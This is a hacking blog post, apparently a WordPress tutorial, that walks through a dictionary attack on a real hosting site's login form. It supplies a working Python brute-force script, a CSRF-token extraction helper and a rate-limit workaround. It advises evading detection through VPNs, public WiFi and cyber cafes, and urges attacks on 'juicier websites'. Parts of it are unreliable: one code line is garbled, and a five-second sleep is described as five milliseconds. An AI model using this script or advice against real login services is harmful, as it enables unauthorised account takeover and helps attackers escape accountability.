I know, I know it’s been way more than one week since my last post. But in my defense, I did say that I’d be very irregular.

Anyhoo, today we’ll get on with some actual hacking. Not the fake kind of totally-important-but-also-eternally-boring-theoretical-foundations of hacking, but c00l l33t h4xx0Rm4n hacking.

Specifically, we’re gonna deal with bypassing HTTP login forms via. a dictionary attack.

A “dictionary”, also called a word-list, is a huge list of probable passwords. We go through every single probable password in this list, and check if it helps us log in to the service. If yes, then we’re done; else we go on to the next one until we do or we exhaust our word-list.

These dictionaries often contain hundreds of thousands and millions of candidate passwords. Even though they’re just plain \*.txt files, the average size of (any good) word-list easily stays in the realm gigabytes.

# Setup

Our target will be a free domain hosting service known as [ProFreeHost](https://profreehost.com/). Nothing against it in particular, just that it had a very rudimentary login system with very little security checks against dictionary attacks and brute-forcing in general.  
For the purposes of this demonstration, I’ve created an account on the site using a temporary e-mail address and a very, very common password, so common that it was on my 2kB password list (that is super tiny for a wordlist). This was done to avoid any sort of legal complications in case our attack was recognized as a DOS by the very able administrative people at ProFreeHost, and also because here in this blog morality and white hat hacking are the virtues that are always upheld no matter what (ROFL).

We’ll be creating our weapon, that is, the attack script using Python 3.x, as opposed to C++ like we did for the last post. As it turns out, network stuff is way easier in Python than in C++ (imagine sockets in C++… _shudders_). Another reason would be that development speed in Python is faster, and the code can be made very readable which makes it helpful for the non-technical readers to understand the voodoo hackerman Dark Arts I’m gonna be invoking today.

All the code I type will work on both Windows and Linux, so it doesn’t matter what you use if you choose to follow along. For the sake of showing how stupid easy this is, I’m going to use Windows.

Now that that’s out of the way, let’s clear up what exactly we are making.

Our goal would be as follows: given an e-mail address pijoy98056@ploneix.com that is bound to an account on the site, get their password and log in to their account.  
There could be many approaches to this. An object-oriented approach using a brute-forcing class and in-built HTML parser and filter would most certainly work here. But so would a quick-and-dirty script with long lines and weird golf-style code. What we require here is a balance between generality and specificity.  
In my experience, following a general approach here isn’t really worth it. Since websites are always dynamic, it is almost always the case that different websites will use different layouts, structures and form parameters. So there wouldn’t be a very “general” way to get a one-size-fits-all abstraction for brute-forcing passwords. Modification on a per-target becomes a necessity.

That’s why I am going to be making a program that will work only for this particular site, and not anywhere else.

I know, I know that’s kinda lame. So I’ll throw in a bonus — I’ll also be describing a general _method_ that you can use to make similar scripts for other targets; a framework of some sorts. All with steps. That way we can still be general while a the same time be specific with our implementation.

Talk about a loophole!

# Foreword

Let’s get this straight. Dictionary attacks for passwords on services you don’t have explicit permission for is illegal. Even if you try it out on your own account, too many requests too frequently can result in a DOS — Denial of Service attack from your end. And that is exactly why I’m going to go ahead and do it.

There are a few things you can do to protect yourself. Use things like a paid VPN or proxy servers to misdirect those who try to trace you. Don’t send too many requests at once (multi-threaders, I’m looking at you). Best thing would be to not hack from your home device at all. Go to a nearby Cyber Cafe or anywhere with free public WiFi. What I’m about to show you can totally be done from a non-rooted Android device, so you can use that to your advantage and make yourself portable. Security is **not a joke.**

But really since these guys are not so big of an organization or something, you can afford to play a little loose here.

Remember, the number one rule of hacking: don’t get caught.

## Reconnaissance

Our first order of business is to size up our target.

![](https://hecktheplanet.files.wordpress.com/2022/09/screenshot-2022-09-22-112208.jpg)

At first glance, the website looks just what we’d expect any free domain hosting service to look like — sus.

Nevertheless, we go to the login page and try to enter with some random password.

But before pressing the submit button, we open the web inspector and go to Network tab. Now submit the form.

A POST request is made by the website to some server. Let’s examine this POST request.

![](https://hecktheplanet.files.wordpress.com/2022/09/screenshot-2022-09-22-102648-2.jpg)

As you can see, this POST request contains three parameters: email, password and login. Keep this thing in mind, because we’ll be modelling our payload with this exact structure.  
Also this is the part where we can lose generality, because different websites may have different POST parameters. Some may need a username, a date of birth, or even include a hidden CSRF token (more on that later). This is exactly why recon work is very important.

## Scripting

Now we can get into the dirty work.  
I’ll be following a functional approach for this program, so it’s all very easy to understand. Also a bit of aesthetic work, because the more flashy and serious looking the output, the better the code (obviously)!

Here’s the thing:

```python
from queue import Queue
import requests

TARGET = "https://profreehost.com/login/"
FAIL_STRING = "is incorrect"
WORDLIST = "G:\\path\\to\\wordlist\\fasttrack.txt"

def get_wordlist_queue(wordlist_url):
	with open(wordlist_url) as f:
		wordlist_data = f.read()
		wordlist_queue = Queue()

		for word in wordlist_data.split():
			wordlist_queue.put(word)

		return wordlist_queue

def trial_payload(session, payload):
	res = session.post(TARGET, data=payload)
	return FAIL_STRING not in res.content.de-()

def bruteforce_password(wordlist_queue):
	payload = {
		"email": "pijoy98056@ploneix.com",
		"password": "",
		"login": ""
	}

	found_match = False
	while not found_match and not wordlist_queue.empty():
		session = requests.Session()
		payload["password"] = wordlist_queue.get()
		found_match = trial_payload(session, payload)

	    print(f"Match:{found_match}\tUsername:{payload['email']}\tPassword:{payload['password']}")

def main():
	print(f"[*] Starting bruteforce attack on {TARGET}")
	print(f"[*] Wordlist: {WORDLIST}")

	wordlist_queue = get_wordlist_queue(WORDLIST)
	bruteforce_password(wordlist_queue)

	print(f"[*] Job completed.")

if __name__ == '__main__':
	main()
```

Yikes, that’s some code. Let’s look at it function by function. Don’t follow the code above, just follow what I’m saying.

We’ll start with the imports.

```python
from queue import Queue
import requests
```

The idea is to hold the passwords in a queue data structure, and pop off the next-in-line as we keep on checking. And of course, the requests library is needed to, well, make requests on the network. That's all, no need for any external packages.

Next, we go to the `main()` function, because that function is called first. We could've also just not used a main function, but where's the fun in that?

```python
def main():
    print(f"[*] Starting bruteforce attack on {TARGET}")
    print(f"[*] Wordlist: {WORDLIST}")

    wordlist_queue = get_wordlist_queue(WORDLIST)
    bruteforce_password(wordlist_queue)

    print(f"[*] Job completed.")
```

Disregard all the `print()` calls, they're just there for aesthetic purposes. The important lines are those two in the middle.<br>The first important line initializes a variable `wordlist_queue` to the result of a function `get_wordlist_queue()` with the argument `WORDLIST`, a global constant. So let's look at this `get_wordlist_queue()` function and hop right back to `main()`.

```python
def get_wordlist_queue(wordlist_location):
    with open(wordlist_location) as f:
        wordlist_data = f.read()

    wordlist_queue = Queue()
    for word in wordlist_data.split():
            wordlist_queue.put(word)

    return wordlist_queue
```

Aha! This function takes a parameter `wordlist_location`, like the actual address on your filesystem where the wordlist you'd like to use is located. It takes that file and stores all the juicy data in a variable `wordlist_data`.<br>Okay.<br>And then a queue `wordlist_queue` is created and all the passwords are individually lined up in this queue.<br>At the end, the function returns this queue. See how easily we abstracted an entire process like this into a simple function call of `get_wordlist_queue()`? That's the beauty of programming.

Back to `main()`!

```python
def main():
    print(f"[*] Starting bruteforce attack on {TARGET}")
    print(f"[*] Wordlist: {WORDLIST}")

    wordlist_queue = get_wordlist_queue(WORDLIST)
    bruteforce_password(wordlist_queue)

    print(f"[*] Job completed.")
```

Look at the second important line -- it's entirely a function call to the function `bruteforce_password()`, and it takes our newly obtained `wordlist_queue` as an argument. So why don't we take a quick gander at its definition.

```python
def bruteforce_password(wordlist_queue):
    payload = {
    "email": "pijoy98056@ploneix.com",
    "password": "",
    "login": ""
   }

    found_match = False
    while not found_match and not wordlist_queue.empty():
        session = requests.Session()

        payload["password"] = wordlist_queue.get()

        found_match = trial_payload(session, payload)

        print(f"Match:{found_match}\tUsername:{payload['email']}\tPassword:{payload['password']}")
```

Yup, that's a big one. Let's start from the top.<br>A dictionary called `payload` is created with the fields `email`, `password` and `login`.<br>Sound familiar?<br>Why it's the same format as the HTTP POST response we got to know about during the recon phase! I told you to keep it in mind, didn't I?<br>Basically, we modify this payload for every password in our queue and send individual requests every time, hoping that one of those work. That is, in a nutshell, the idea behind brute-forcing.

On the next line we see that a variable called `found_match` is initialized to the boolean value of `False`. Such a variable in programming is called a flag, and is useful for when we have to signal for some kind of event in our program. Here you could guess that `found_match` signals if the password we're trying works. That's because the very next line has a while-loop in it.

```python
    while not found_match and not wordlist_queue.empty():
```

This is where Python really shines, because the entire line reads as if it is written in English: while a match is not found and our wordlist queue is not empty, do... whatever instructions are in the following indented block.

```python
        session = requests.Session()

        payload["password"] = wordlist_queue.get()

        found_match = trial_payload(session, payload)
```

The first three lines help get the HTML are pretty common when using the `requests` library in Python. They essentally help us create an HTTP `session` in which we work in.

The next line sets the `"password"` key of the `payload` dictionary to the next password in line to be tested, which we `get()` from our `wordlist_queue`.

Thereafter, we set our `found_match` flag to be equal to the value returned by the function call `trial_payload(session, payload)`. Let's check this function out.

```python
def trial_payload(session, payload):
   res = session.post(TARGET, data=payload)
   return FAIL_STRING not in res.content.de-()
```

This function takes two arguments -- an active HTTP `session` object and a `payload` to trial on.

`res` would be the HTTP response that we receive after we fire the payload.

What we return is a condition, whether a certain `FAIL_STRING` is present somewhere in the HTML - of our response. What's this all about?

If you go to the top of the program, you'll find `FAIL_STRING` is a variable set to the string `"is incorrect"`. What this means to say is, if the words "is incorrect" is found in the response we get after trying out a particular password, then that must mean our password is incorrect. In that case, our trial was unsuccessful, so return a value of `False`.

This very `False` is passed on to `found_match`, and the while-loop loops on and on and on and on and on until we get one lucky password which has a successful trial so that `found_match` becomes `True` and the loop breaks.

And that is the how the code works. Phew, that was a lot of explanation. But at least everyone has a fair chance of understanding how it works and all. Feel free to completely blow by everything I wrote if you already get how the code is working, haha.

## Deploying

This is the easier part. I saved this program in a file called `brute-lee.py`, after the infamous Chinese martial artist/hacker Brute Lee, famous for his lightning fast brute-force attacks on secure systems.

Then it's just a matter of running the program and witnessing the glory.

![](https://hecktheplanet.files.wordpress.com/2022/09/screenshot-2022-09-22-101146_li.jpg?)

Well, well, well, would you look at that! It turns out that pijoy98056@ploneix.com had the password `password123` registered to it on the site.

And indeed we can go ahead and log in with these credentials. Hurray for brute-forcing!

## Possible Problems

Fact of the matter is, you wouldn't always want to hack <a rel="noreferrer noopener" href="https://profreehost.com/" target="_blank">https://profreehost.com/</a>. No, not when there are juicier websites out their, websites with people registered having weak passwords.

Some of these websites have a rate limiter. You won't be able to consecutively attempt to log in. The following snippet might come in handy:

```python
import time
time.sleep(5)
```

This would pause the program for a solid 5 milliseconds. You an change the value as per your need.

Some websites will have what is known as a CSRF token or a user token sent in the POST request along with the form. This sort of helps to protect against some automated attacks. Most of the time this token can be found as a hidden input field in the HTML form. If that is the case, then the following function can help to extract the token:

```python
def get_user_token(raw_html):
    raw_arr = raw_html.split()
    for i in range(len(raw_arr)):
        if "user_token" in raw_arr[i]:
            return raw_arr[i + 1].strip().replace("value='", "")[:-1]
```

## Takeaways

In the end, these kinds of automated form-filling dictionary attacks are very inefficient and have a high failure rate if the target has half a decent brain to use a good password. Therefore, this should be treated as a last-resort kind of thing in the scheme of the grand attack.

# Is this really the best way?

Absolutely not!

The best way to dictionary attack login forms would be to use pre-built tools such as <a rel="noreferrer noopener" href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">Hydra</a>, which reduces the entirety of this post into framing and executing a single command. <a rel="noreferrer noopener" href="https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/" target="_blank">This article</a> shows you how, in case you're interested.

And as an added bonus, <a rel="noreferrer noopener" href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force" target="_blank">this link</a> gives a rundown of everything you would ever need to know about Hydra, and then some.

<hr />

And that will be all for this post. It turned out to be longer than what I initially expected, but who cares? I do it for the lulz.

So if the legal team at ProFreeHost doesn't come and obliterate this blog, I guess we'll be meeting again at an unknown time. Until then,

_Auf Wiedersehen!_
